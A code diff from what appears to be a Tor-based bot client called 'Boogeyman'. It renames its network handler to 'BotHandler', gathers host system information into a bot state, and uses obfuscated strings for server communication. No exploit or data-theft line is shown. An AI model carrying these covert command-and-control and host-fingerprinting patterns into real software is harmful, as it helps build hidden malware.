@@ -1,23 +1,26 @@
-use std::path::PathBuf;
 use anyhow::{ Context, Result };
 use client_vars::{
-    constants::client_version,
+    constants::{ client_tag, client_version },
     types::{
         receive::{ self, BoogeymanReceivePayload },
         send::{ BoogeymanSendPayload, ServerAction, ServerParams },
+        structs::BotState,
     },
 };
-use shared::network::tor::{ ServerReceiveType, TorHandler };
+use shared::network::tor::{ LoggerConfig, ServerReceiveType, TorHandler };
 use obfstr::obfstr as s;
+use crate::utils::system_info::generate_bot_state;
 
-pub struct BoogeymanTorHandler {
+pub struct BotHandler {
     tor_handler: TorHandler,
+    bot_state: BotState,
 }
 
-impl BoogeymanTorHandler {
-    pub async fn new(log_directory: PathBuf, log_encryption_key: String) -> Result<Self> {
-        let tor_handler = TorHandler::new(log_directory, log_encryption_key).await?;
-        Ok(BoogeymanTorHandler { tor_handler })
+impl BotHandler {
+    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
+        let tor_handler = TorHandler::new(logger_config).await?;
+        let bot_state = generate_bot_state(client_tag()).await;
+        Ok(BotHandler { tor_handler, bot_state })
     }
 
     pub async fn run_handler(&mut self) {
